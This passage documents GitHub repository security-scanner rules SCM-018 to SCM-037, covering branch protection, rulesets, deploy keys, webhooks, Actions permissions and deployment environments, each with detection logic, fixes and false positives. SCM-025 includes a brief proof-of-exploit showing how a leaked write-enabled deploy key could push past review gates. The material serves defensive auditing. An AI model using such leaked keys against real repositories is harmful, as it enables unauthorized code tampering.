- Multiple GitHub Security Lab writeups attribute post-incident review-control gaps to legacy bypass entries: a contractor onboarded years earlier is listed in the allowance, a compromise of that contractor account merges tampered code despite the team having added required reviews on the default branch.

**Source:** [`SCM-018`](../providers/scm.md#scm-018) in the [SCM provider](../providers/scm.md).

### `SCM-019`: Push restrictions allowlist names individual users <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-019 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``restrictions.users`` from the branch protection payload. Fires when the list is non-empty. ``restrictions`` itself being absent is the default GitHub posture (no push allowlist; review gates govern access) and passes this rule. Teams and apps in ``restrictions`` are not flagged — the rule audits the personal-account subset specifically.

**Recommendation.** In the default-branch protection rule, audit the ``Restrict who can push to matching branches`` allowlist (``restrictions`` in the API). Move each individual user into a GitHub team and add the team instead, or replace with a GitHub App / bot service account when the entry is an automation. Named user entries are personal-compromise vectors that bypass every PR-review gate on the branch.

**Known false positives.**

- A break-glass admin account intentionally listed for incident response is a legitimate use case. Suppress via ignore-file once the account's access has been reviewed (MFA, hardware token, audit-logged use).

**Source:** [`SCM-019`](../providers/scm.md#scm-019) in the [SCM provider](../providers/scm.md).

### `SCM-020`: Default workflow GITHUB_TOKEN has write permission <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-020 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens, [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Reads ``default_workflow_permissions`` from ``GET /repos/{owner}/{repo}/actions/permissions/workflow``. Values are ``"read"`` (safe) or ``"write"`` (fail). Requires the token to have ``admin`` scope on the repo; without it GitHub returns 403 and the rule passes silently with an unavailability note. Complements GHA-048 / GHA-049 — those catch the *workflow* asking for write; SCM-020 catches the *org / repo* handing out write by default.

**Recommendation.** In repo Settings → Actions → General → Workflow permissions, set the default to ``Read repository contents and packages permissions``. Workflows that genuinely need to push, comment on PRs, or modify issues opt in explicitly via the workflow-file ``permissions:`` block. The default ``write`` setting gives every workflow's ``GITHUB_TOKEN`` write access to every API surface the repo exposes (contents, issues, PRs, actions, packages, deployments), so a single compromised dependency in any job is one step away from the GHA-048 / GHA-049 worm-propagation primitives (workflow self-mutation, cross-repo push) the rule pack catches at the workflow-YAML layer. Setting the default to ``read`` is the org-side complement: even if a workflow forgets to declare ``permissions:`` and the compromised dep tries to push, GitHub refuses the operation.

**Known false positives.**

- Repos where every workflow legitimately needs write access (release-publishing automation, mirror-sync jobs) may set the default to ``write`` deliberately. The right pattern is still to keep the default at ``read`` and grant write at the workflow level — that way a new workflow (added by a future contributor) starts safe. Suppress only when every workflow in the repo carries an explicit ``permissions:`` block.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the worm's propagation primitive was a stolen ``GITHUB_TOKEN`` with ``contents: write`` and ``workflows: write``. Repos whose default workflow permissions were ``read`` were unaffected even when their workflows ran a compromised npm dep; ``write``-default repos handed the worm the keys.

**Source:** [`SCM-020`](../providers/scm.md#scm-020) in the [SCM provider](../providers/scm.md).

### `SCM-021`: Actions can approve pull requests (self-approval bypass) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-021 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``can_approve_pull_request_reviews`` from ``GET /repos/{owner}/{repo}/actions/permissions/workflow``. ``True`` is the fail signal; ``False`` (or absent) passes. Requires admin scope on the repo. Complements SCM-002 / SCM-011 / SCM-014 — without SCM-021, those rules document intent rather than enforcement, because Actions can fulfil the review requirement itself.

**Recommendation.** In repo Settings → Actions → General → Workflow permissions, uncheck ``Allow GitHub Actions to create and approve pull requests``. With it on, any workflow whose ``GITHUB_TOKEN`` includes ``pull-requests: write`` can submit an approving review on a PR — including its own. Required-review controls (SCM-002), CODEOWNERS reviews (SCM-011), and last-push approval (SCM-014) all become advisory once Actions can satisfy their own gate. A compromised dependency that opens a PR can immediately approve and merge it without any human in the loop.

**Known false positives.**

- Some orgs allow Actions self-approval as part of a tightly-scoped automation flow (e.g., a code-formatter bot that opens-and-merges its own PRs). The safer pattern is to grant the bot a dedicated PAT scoped to PR-create-and-approve, not the repo-wide GITHUB_TOKEN. Suppress only when the trade-off has been documented.

**Source:** [`SCM-021`](../providers/scm.md#scm-021) in the [SCM provider](../providers/scm.md).

### `SCM-022`: Repo Actions permissions allow any source (no allow-list) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-022 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-TRUSTED-REG`](#ctrl-esf-s-trusted-reg) Use only trusted, authenticated package and image registries.

**How this is detected.** Reads ``allowed_actions`` from ``GET /repos/{owner}/{repo}/actions/permissions``. Values: ``"selected"`` (allow-listed) and ``"local_only"`` (org-internal only) pass; ``"all"`` (no restriction) fails. Requires admin scope. The rule passes silently when Actions is disabled at the repo level (``enabled: false``) — nothing runs, so the source restriction is moot.

**Recommendation.** In repo Settings → Actions → General → Actions permissions, set the allow-list mode to ``Allow <owner>, and select non-<owner>, actions and reusable workflows`` (``selected``) and curate a list of trusted publishers. Each new third-party action becomes an explicit decision rather than the result of a workflow writer adding ``uses: random/unknown@v1`` and CI silently executing it. The shipped pack of GHA-040 (compromised-action registry) plus GHA-041..047 (action reputation checks) provides the workflow-time signal; SCM-022 is the org-policy gate that says ``don't even let an untrusted action onto the runner.``

**Known false positives.**

- Repos that legitimately consume a wide variety of third-party actions (open-source CI examples, marketplace-aggregator demos) may accept the ``all`` mode as a trade-off. The right defense in that case is rigorous SHA-pinning (GHA-001) plus the GHA-040..047 reputation pack; SCM-022 is the org-level allow-list that becomes redundant when every workflow already pins to a vetted commit.

**Source:** [`SCM-022`](../providers/scm.md#scm-022) in the [SCM provider](../providers/scm.md).

### `SCM-023`: Deployment environment lacks required-reviewer protection <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-023 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/environments`` and flags every environment whose ``protection_rules`` list doesn't include a rule with ``type == "required_reviewers"``. Passes silently when no environments are configured (``total_count: 0``) — there's nothing to evaluate. Pairs with GHA-050 (the workflow-layer rule that checks ``jobs.<id>.environment:`` is declared) and SCM-024 (deployment-branch-policy on the same environments).

**Recommendation.** Configure required reviewers on every deployment environment (Settings → Environments → <name> → ``Required reviewers``). Pick a team or set of users who must approve each deployment job that targets the environment. Without a required-reviewer protection rule, any workflow run with the right environment name in its ``jobs.<id>.environment:`` block can deploy without human gate — the exact primitive GHA-050 (publish without OIDC + environment) catches at the workflow layer. SCM-023 is the org-level complement: a workflow that *declares* an environment still needs the environment itself to enforce the gate.

**Known false positives.**

- Non-production environments (``preview``, ``staging-ephemeral``) that legitimately auto-deploy without human gate are flagged by this rule, since GitHub doesn't distinguish environment severity. Suppress on those specific environment names with a rationale rather than disabling the rule for the whole repo.

**Source:** [`SCM-023`](../providers/scm.md#scm-023) in the [SCM provider](../providers/scm.md).

### `SCM-024`: Deployment environment can deploy from any branch <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-024 }

**Evidences:** [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) Separate deployment environments (dev / staging / prod).

**How this is detected.** Reads each environment's ``deployment_branch_policy`` field. ``null`` means any branch can deploy and fails; ``{"protected_branches": true}`` or ``{"custom_branch_policies": true}`` (with at least one configured policy) passes. Passes silently when no environments are configured. Pairs with SCM-023 (required reviewers on the same environments); both knobs together close the deploy-gate loop.

**Recommendation.** Configure a deployment-branch policy on every environment (Settings → Environments → <name> → ``Deployment branches and tags``). Pick ``Protected branches only`` for production-like environments so a workflow run on a feature branch cannot push to production. The combination ``required reviewers`` (SCM-023) + ``deployment branch policy`` (SCM-024) is the deploy-gate the rest of the rule pack (GHA-050 publish-without-OIDC, SCM-001 branch protection) assumes is in place; without SCM-024, a workflow on any branch can target the production environment and reviewers approve a stale or wrong-branch deployment without realizing.

**Known false positives.**

- Test / preview environments often accept any branch by design (the whole point is to validate feature branches before merging). Suppress on those specific environment names; treat the rule as production-scoped.

**Source:** [`SCM-024`](../providers/scm.md#scm-024) in the [SCM provider](../providers/scm.md).

### `SCM-025`: Repo has write-enabled deploy keys (push backdoor) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-025 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Reads ``GET /repos/{owner}/{repo}/keys`` and flags every deploy key whose ``read_only`` field is false. Requires ``admin`` scope on the repo; without it GitHub returns 403 / 404 and the rule passes silently with an unavailability note. Deploy keys come in two shapes: read-only (clone access only, safe equivalent of a public-fork checkout) and write-enabled (push access, the failure case this rule catches). The endpoint returns the SSH public key plus metadata, never the private half — the scan can't recover the credential, only enumerate which keys exist and what scope each carries.

Complements every branch-protection rule in the pack: without SCM-025, an unaudited write deploy key bypasses the entire control set the other rules document. Also pairs with SCM-018 (PR-review bypass allowance) and SCM-019 (push-restriction allowlist), which catch the same risk shape on the user / team side.

**Recommendation.** Convert every deploy key to read-only (Settings → Deploy keys → uncheck ``Allow write access``), then rotate the underlying SSH key pair if the previous holder no longer needs write access. Deploy keys are repo-scoped SSH credentials that bypass GitHub's normal RBAC — anyone with the private half can push directly, side-stepping branch protection (SCM-001), required reviews (SCM-002), CODEOWNERS (SCM-011), and the user-account audit trail. If the use case genuinely needs push (a CI runner that tags releases, a release-bot account), prefer a fine-grained PAT or a GitHub App with constrained scope, both of which carry user-visible audit-log entries that deploy keys do not.

**Known false positives.**

- Some CI flows legitimately use a write deploy key for release tagging or auto-generated docs commits. The right pattern is a GitHub App or a fine-grained PAT with an audit trail; deploy keys persist indefinitely and leave no record of who used them. Suppress with a one-line rationale that names the specific key title.

**Seen in the wild.**

- Long-running pattern of forgotten deploy keys retaining write access years after the original owner left an org. Public catalogs of leaked SSH private keys on paste sites and GitHub itself routinely hit configured deploy keys; the corresponding repo is push-compromised until the operator revokes the key.

**Proof of exploit.**

```
# Vulnerable: a write-enabled deploy key sits on the repo
# for years. The private half lived on a contractor's
# laptop and was checked into a public gist during a
# transient debug session.
GET /repos/acme/payments-api/keys
[
  {
    "id": 42,
    "title": "ci-runner-prod (added 2021-03)",
    "key": "ssh-ed25519 AAAA... ci-runner",
    "read_only": false,
    "created_at": "2021-03-04T10:00:00Z"
  }
]

# Attack: ``git push git@github.com:acme/payments-api.git``
# using the leaked private key writes directly to master,
# bypassing every required-review / CODEOWNERS / status-
# check gate the other SCM rules document. The push shows
# up in the audit log as ``key:42`` rather than a user
# account, so detection requires correlation across
# audit-log events most operators never review.

# Safe: revoke the deploy key. If write access is
# genuinely required for CI tagging, switch to a GitHub
# App with constrained scope plus a one-line audit-log
# entry per push.
```

**Source:** [`SCM-025`](../providers/scm.md#scm-025) in the [SCM provider](../providers/scm.md).

### `SCM-026`: Webhook ships events insecurely (HTTP / no-TLS / no-secret) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-026 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``GET /repos/{owner}/{repo}/hooks`` and flags any active webhook with one or more failure modes:

* ``config.url`` starts with ``http://`` — push payloads   including code diffs leak over plain HTTP
* ``config.insecure_ssl == "1"`` — TLS certificate   verification disabled, MITM possible on the HTTPS   endpoint
* ``config.secret`` is null / missing — no HMAC   signature, so anyone who learns the URL can forge   events into the receiver

Inactive webhooks (``active: false``) are skipped — they don't fire. Each finding's description lists every failure mode hit so the operator sees the full fix scope per webhook. Requires admin scope; without it the endpoint returns 403 / 404 and the rule passes silently. GitHub never returns the actual secret value via the API; the slot reports either ``"********"`` (configured) or ``null`` (missing), so this rule detects the absence without ever handling the credential itself.

**Recommendation.** For each flagged webhook, fix all three knobs at once (Settings → Webhooks → <hook> → Edit):

* Switch the Payload URL to ``https://`` and enable ``Verify SSL`` (the field is labeled ``SSL verification`` on the form; setting it to ``Enable SSL verification`` is the safe value).
* Set the ``Secret`` field to a long random value and validate the incoming ``X-Hub-Signature-256`` header on the receiving end. Without the secret + verification, an attacker who learns the URL (URLs are not secrets; they appear in receiving-system logs, in CI screenshots, in support tickets) can forge events.

If the receiving service genuinely cannot handle HTTPS or shared secrets, terminate TLS at a reverse proxy in front of the receiver and keep the public-facing URL ``https://`` with a real cert. The webhook content carries the full event payload — pull requests with diff content, push events with the commits, secret scanning alerts — which is exactly what an unauthenticated MITM is looking for.

**Known false positives.**

- Long-running internal-only webhooks pointing at a hostname only resolvable inside a private network (``http://internal.svc/hook``) often skip TLS by convention. The right fix is still to terminate TLS at an ingress and use a non-empty secret; the rule does not have visibility into network topology and cannot distinguish 'public HTTP' from 'private-network HTTP', so it errs toward flagging. Suppress per webhook id with a rationale that names the receiving service.

**Seen in the wild.**

- Long-running pattern of webhook payloads leaking via plain-HTTP receivers (Zapier, IFTTT, custom legacy endpoints) — the GitHub repo's commit-diff content, pull-request body, and secret-scanning alert payloads all land on the wire unencrypted. Public catalogs of compromised internal webhooks document the receiver-side breach where the URL alone was enough to inject forged events when no shared secret was configured.

**Source:** [`SCM-026`](../providers/scm.md#scm-026) in the [SCM provider](../providers/scm.md).

### `SCM-027`: Outside collaborator holds write / maintain / admin access <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-027 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/collaborators?affiliation=outside`` and flags every entry whose ``permissions`` block has any of ``admin: true``, ``maintain: true``, or ``push: true``. Read-only (``permissions.pull: true`` with no higher tier) and triage entries pass. Each finding's description names every elevated collaborator with the granular level so the operator can prioritize.

Requires admin scope on the repo to enumerate the outside-collaborator list; without it the endpoint returns 403 and the rule passes silently with an unavailability note. The hydrator fetches a single page (``per_page=100``); in the rare case of more than 100 outside collaborators on one repo, the description appends a truncation note and asks for a manual audit.

**Recommendation.** Audit Settings → Collaborators and teams → Outside collaborators. For each entry the rule flagged: either (a) downgrade the access to ``Read`` if the contributor only needs to clone / open PRs, or (b) move the account into the org as a member (so the org's centralized RBAC, SCIM, and access-review processes apply) before granting write access. Outside collaborators bypass the org's user-lifecycle controls: when the contractor's term ends, the entry stays until somebody manually removes it. A compromised outside-collab account with ``push`` access is the direct path to bypassing branch protection: that account can push code that SCM-021 (Actions self-approval) or SCM-018 (PR bypass allowance) clears through every required-review gate. Maintain / admin extends the blast radius to repo-config control.

**Known false positives.**

- Some flows legitimately grant write access to a vetted outside collaborator on a short-term basis (audit firm, incident responder, vendor escalation). The right compensating control is a calendar-bound suppression with the rationale and the expected revocation date; the rule itself should keep flagging the access so the revocation date is visible at every scan.

**Seen in the wild.**

- Long-running pattern across compromise postmortems: a former contributor's outside-collaborator entry retains ``push`` access years after the engagement ended. The account is then taken over (often by credential stuffing or a leaked PAT), and the attacker pushes a tampered commit that lands without review because the access level itself is the gate.

**Source:** [`SCM-027`](../providers/scm.md#scm-027) in the [SCM provider](../providers/scm.md).

### `SCM-028`: Private repo allows forking <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-028 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``private`` and ``allow_forking`` from the repo metadata. Fires when both are ``true``. Public repos (``private: false``) pass — forking a public repo is expected. Repos that explicitly disable forking (``allow_forking: false``) pass regardless of visibility. The fork-vs-Actions-secret-leak interaction is the operational risk: a fork PR using ``pull_request_target`` runs with the *base* repo's secrets, so a fork carries both the code and a path to the secrets if the workflow surface is permissive. Pairs with GHA-027 (``pull_request_target`` on untrusted input) and GHA-046 (manual PR-head fetches on untrusted triggers) at the workflow layer; SCM-028 is the org-policy gate.

**Recommendation.** In repo Settings → General → Features, uncheck ``Allow forking``. The setting only opens the trapdoor if you actually use ``pull_request_target`` or trigger workflows on fork PRs, but every private-repo fork carries the code into the forker's personal namespace (which has its own visibility surface — public profile, weaker 2FA enforcement, separate token scope). Even without the Actions-secret leak surface, allowing forks of a private repo means a compromised user account that had access at any point can preserve a copy of the intellectual property indefinitely.

If forks are genuinely needed for the development workflow, enforce ``Allow forking`` at the org level and pair it with GHA-046 (block manual PR-head fetches on untrusted-trigger workflows) and GHA-027 (no ``pull_request_target`` on untrusted input) so the secret-leak surface stays closed at the workflow layer.

**Known false positives.**

- Org-wide development workflows that require contributors to fork-and-PR within the company (rather than push to branches in the original repo) legitimately rely on ``allow_forking: true`` for private repos. The right compensating control is the workflow-side hardening: GHA-027 / GHA-046 / SCM-021 (Actions self-approval off) together keep the secret-leak surface closed even when forks are allowed. Suppress with a rationale that names the contribution workflow.

**Source:** [`SCM-028`](../providers/scm.md#scm-028) in the [SCM provider](../providers/scm.md).

### `SCM-029`: Repository ruleset is in evaluate / disabled mode (not enforced) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-029 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/rulesets`` and flags every entry whose ``enforcement`` is anything other than ``"active"``. Two failure shapes are typical:

* ``enforcement: "evaluate"`` — preview / dry-run mode;   the ruleset logic runs but doesn't block.
* ``enforcement: "disabled"`` — explicit off; rule   exists in the UI but takes no effect.

Passes silently when no rulesets are configured (``[]``); in that case the SCM-001..010 legacy branch-protection rules carry the governance load. Requires admin scope on the repo; without it the endpoint returns 403 / 404 and the rule passes silently with an unavailability note.

**Recommendation.** Flip every non-enforcing ruleset to ``enforcement: active`` (Settings → Rules → Rulesets → <name> → Enforcement status → Active). The ``evaluate`` mode is intentionally permissive: it runs the rule logic and surfaces what *would* have been blocked, but it never actually blocks the push, merge, or commit. ``disabled`` is the explicit off-switch. Both modes silently document intent without enforcing the policy — operators commonly create rulesets in ``evaluate`` to preview their effect and forget to flip them, leaving the repo with the audit appearance of governance and the behavior of none.

Note: the legacy-branch-protection rules in this pack (SCM-001..010) do NOT see rulesets. An org that has fully migrated to rulesets can pass the entire SCM-NNN legacy pack while every actual governance signal is in evaluate mode.

**Known false positives.**

- A freshly-authored ruleset legitimately sits in ``evaluate`` mode for a short audit window before promotion to ``active``. Suppress for that specific ruleset id with a calendar-bound rationale; the rule should keep flagging until the promotion lands so the transition window doesn't quietly become permanent.

**Source:** [`SCM-029`](../providers/scm.md#scm-029) in the [SCM provider](../providers/scm.md).

### `SCM-030`: Repository ruleset has bypass actor with bypass_mode: always <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-030 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** For each ``active`` ruleset, walks ``bypass_actors`` (populated by the per-ruleset detail fetch) and flags every entry with ``bypass_mode: "always"`` whose ``actor_type`` is not ``"Integration"`` (GitHub Apps). Non-app actors are listed by ``actor_type`` + ``actor_id``; the rule does not resolve those IDs to human-readable names (that would require another API round-trip per actor; the operator already sees the names in the UI when they go to fix it).

Rulesets in non-active enforcement modes are skipped — SCM-029 owns the not-enforced-at-all case and a non-active ruleset's bypass list is moot since the rules don't run anyway. Integration bypasses pass: a scoped GitHub App is a typical legitimate emergency-fix channel and shipping the bypass through the App's audit flow is the documented pattern. Requires admin scope; without it the ruleset-detail endpoint returns 403 / 404 and the rule passes silently.

**Recommendation.** For every bypass actor flagged, switch ``bypass_mode`` from ``always`` to ``pull_request`` in the ruleset configuration (Settings → Rules → <ruleset> → Bypass list → <actor> → Bypass mode). The ``pull_request`` mode requires the bypass to be requested via a PR review thread, which leaves an audit trail and gives reviewers a chance to push back. ``always`` mode is an unaudited override: the actor pushes / merges as if the ruleset weren't there, and no record names who or why. If the bypass is genuinely needed for emergency response, scope it to a specific GitHub App (the rule does not flag ``Integration`` bypasses by default) rather than a human role; an App is callable through your existing ticketing / approval flow.

**Known false positives.**

- Some orgs grant ``always`` bypass to a tightly-scoped automation team for after-hours emergency response. The right pattern is a GitHub App with auditable triggering (PagerDuty, Slack); ``always`` bypass for a human team leaves no record of the override. Suppress on the specific ruleset id with a calendar-bound rationale that names the audit channel and the next promotion review.

**Source:** [`SCM-030`](../providers/scm.md#scm-030) in the [SCM provider](../providers/scm.md).

### `SCM-031`: Repo allows auto-merge (no human-timing gate) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-031 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** Reads ``allow_auto_merge`` from the repo metadata (already fetched by every SCM scan; no extra endpoint). Fires when the value is ``true``. A missing field is treated as the GitHub default (``false``) and passes. The check is intentionally orthogonal to whether reviews are required — auto-merge with strong required-review controls is sometimes acceptable, auto-merge with weak ones is not. SCM-031 surfaces the trade-off; the operator pairs the finding with the SCM-002 / SCM-011 / SCM-014 / SCM-021 status to decide whether to keep auto-merge.

**Recommendation.** In repo Settings → General → Pull Requests, uncheck ``Allow auto-merge``. With auto-merge on, the PR merges the moment its required checks pass — including any required reviews already on the PR — with no further human gate on *when* the merge happens. The risk is compositional: combined with SCM-021 (Actions can self-approve PRs) or SCM-018 (PR-review bypass allowance), a workflow that opens a PR, satisfies its own required-review gate, and waits for status checks lands code into main without a human ever looking at the diff at the merge moment. If the workflow itself is what was compromised (Shai-Hulud, postinstall worm), the auto-merge step is the last gate that didn't fire.

If your team relies on auto-merge for throughput, the compensating controls are SCM-021 (Actions cannot self-approve), SCM-002 (required reviews ≥ 1), SCM-011 (CODEOWNERS reviews required), and SCM-014 (last-push approval) — all together. Without all four, auto-merge is the path of least resistance for an unauthored commit to reach main.

**Known false positives.**

- High-throughput engineering orgs that pair auto-merge with rigorous required-reviews + CODEOWNERS + last-push approval + no-Actions-self-approval (SCM-021) legitimately depend on auto-merge for velocity. The right pattern is to suppress this rule with a rationale that names the compensating controls so the trade-off stays visible at every audit. Suppressing without naming the controls makes the trade-off invisible to the next reviewer.

**Source:** [`SCM-031`](../providers/scm.md#scm-031) in the [SCM provider](../providers/scm.md).

### `SCM-032`: Active ruleset doesn't require a PR review (governance theater) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-032 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** For every active ruleset (``enforcement: "active"``) with an evaluable detail body, walks the ``rules`` array looking for an entry with ``type: "pull_request"`` whose ``parameters.required_approving_review_count`` is at least 1. Fires when none is found. Non-active rulesets are SCM-029's surface; rulesets with unavailable detail are surfaced with an evaluation-gap note (the same pattern SCM-030 uses).

Pairs with SCM-002 (legacy branch-protection required reviews) and SCM-029 (ruleset not enforced). The three rules together cover the required-review surface: SCM-002 for legacy BP, SCM-029 for the existence of an active ruleset, SCM-032 for whether that ruleset actually requires a PR.

**Recommendation.** Add a ``pull_request`` rule to every active ruleset and set ``parameters.required_approving_review_count`` to at least 1 (Settings → Rules → <ruleset> → Add rule → Require a pull request before merging → Required approvals). An active ruleset without a PR-review gate is the same shape as legacy branch protection without required reviews (SCM-002): the ruleset is enforced — force-push denial, signed commits, status checks may all fire — but pushes / merges still go through without human review. Operators commonly create rulesets for specific governance signals (e.g., commit-message patterns for compliance) and forget that the PR-review gate is a separate rule type that has to be added explicitly.

SCM-032 evaluates rulesets in isolation: it does not consult legacy branch-protection state, so it fires on any active ruleset that lacks a PR-review rule, even when legacy branch protection on the same ref provides the required-review gate. SCM-002 covers the legacy branch-protection side; the two rules together describe the full review-control surface.

**Known false positives.**

- Some rulesets are deliberately scoped to enforce only non-PR-review controls (e.g., a ``commit_message_pattern`` ruleset for changelog compliance, or a ``tag_name_pattern`` ruleset for release tagging). The right pattern is to ALSO have a separate ruleset that enforces PR reviews on the same refs; SCM-032 fires when the *combination* leaves a gap. Suppress on the specific ruleset id with a rationale that names the PR-review channel (separate ruleset or legacy branch protection).

**Source:** [`SCM-032`](../providers/scm.md#scm-032) in the [SCM provider](../providers/scm.md).

### `SCM-033`: Active ruleset doesn't require status checks <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-033 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "required_status_checks"`` whose ``parameters.required_status_checks`` lists at least one context. Empty lists are treated as no rule. Non-active rulesets are SCM-029's surface; rulesets with unavailable detail are surfaced explicitly. Passes silently when no rulesets are configured (legacy branch-protection SCM-008 covers the gap).

**Recommendation.** Add a ``required_status_checks`` rule to every active ruleset and populate ``parameters.required_status_checks`` with the names of the contexts that must pass (Settings → Rules → <ruleset> → Add rule → Require status checks to pass before merging → pick the specific check runs). Without it, the ruleset is enforced but pushes / merges land without any of your tests, lint, security scans, or build verification actually being green — the ruleset documents that checks *exist* without requiring them to *pass*. The ruleset analog of SCM-008 (legacy branch-protection required checks).

An empty contexts list (``required_status_checks: []``) is the same as no rule — it documents the gate without filling it. Pick at least one canonical job name (the primary build) and add the rest of your CI matrix over time.

**Known false positives.**

- Some rulesets are deliberately scoped to non-CI concerns (commit-message format, tag-name pattern); those should be paired with a separate ruleset that enforces status checks on the same refs. Suppress with a rationale that names the parallel ruleset.

**Source:** [`SCM-033`](../providers/scm.md#scm-033) in the [SCM provider](../providers/scm.md).

### `SCM-034`: Active ruleset doesn't block force-push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-034 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "non_fast_forward"``. Presence of the rule means force-pushes are blocked on the refs the ruleset targets. Passes silently when no rulesets are configured (legacy SCM-007 covers the gap).

**Recommendation.** Add a ``non_fast_forward`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Block force pushes). Without it, a force-push rewrites history on the target branch — commits that previously appeared in the audit trail disappear from the surface log, and anyone with push access can erase evidence of an earlier action. The ruleset analog of SCM-007 (legacy branch-protection force-push denial). Pair with SCM-006 (signed commits) so even a rewrite leaves verifiable signatures on the surviving commits.

**Known false positives.**

- Release-engineering rulesets sometimes deliberately allow force-push on a specific tag-pattern target (e.g. moving release tags). Suppress on the specific ruleset id with a rationale that names the target pattern.

**Source:** [`SCM-034`](../providers/scm.md#scm-034) in the [SCM provider](../providers/scm.md).

### `SCM-035`: Active ruleset doesn't block branch deletion <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-035 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "deletion"``. Presence of the rule means deletion is blocked. Passes silently when no rulesets are configured (legacy SCM-009 covers the gap).

**Recommendation.** Add a ``deletion`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Restrict deletions). Without it, anyone with push access to a ref the ruleset targets can delete that ref. The ruleset analog of SCM-009 (legacy branch-protection branch deletion denial). Mostly a hygiene control — deleted commits are recoverable from the reflog until garbage collection — but loss of the default-branch ref is a real operational disruption.

**Known false positives.**

- Rulesets that target ephemeral preview / feature branches legitimately allow deletion. Suppress on the specific ruleset id with a rationale that names the target pattern.

**Source:** [`SCM-035`](../providers/scm.md#scm-035) in the [SCM provider](../providers/scm.md).

### `SCM-036`: Active ruleset doesn't require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-036 }

**Evidences:** [`ESF-D-TAMPER`](#ctrl-esf-d-tamper) Protect build artifacts from tampering and detect unauthorized modification.

**How this is detected.** For every active ruleset, looks for an entry in the merged ``rules`` array with ``type: "required_signatures"``. Presence means commits to the targeted refs must carry a valid signature. Passes silently when no rulesets are configured (legacy SCM-006 covers the gap).

**Recommendation.** Add a ``required_signatures`` rule to every active ruleset (Settings → Rules → <ruleset> → Add rule → Require signed commits). Without it, a compromised contributor account (or a stolen PAT) can push commits that appear to originate from any author the attacker names in the commit metadata. The signature requirement ties each commit to a key the contributor controls (SSH / GPG / sigstore via gitsign), so post-incident the audit log shows which commits were signed by the key vs forged. The ruleset analog of SCM-006 (legacy branch-protection signed-commit enforcement).

**Known false positives.**

- Teams that haven't yet rolled out signing keys for all contributors sometimes ship without signature enforcement to avoid blocking ordinary PRs. The right pattern is a phased rollout (configure the rule in ``evaluate`` mode first, then flip to ``active`` once contributors have their keys). Suppress with a rationale that names the rollout date.

**Source:** [`SCM-036`](../providers/scm.md#scm-036) in the [SCM provider](../providers/scm.md).

### `SCM-037`: Active ruleset's pull_request rule doesn't dismiss stale reviews <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-037 }

**Evidences:** [`ESF-D-CODE-REVIEW`](#ctrl-esf-d-code-review) Require peer review of source and pipeline configuration.

**How this is detected.** For every active ruleset with a ``pull_request`` rule, checks ``parameters.dismiss_stale_reviews_on_push`` is ``true``. Skips rulesets that don't have a ``pull_request`` rule at all — SCM-032 owns that surface. Passes silently when no rulesets are configured (legacy SCM-012 covers the gap).

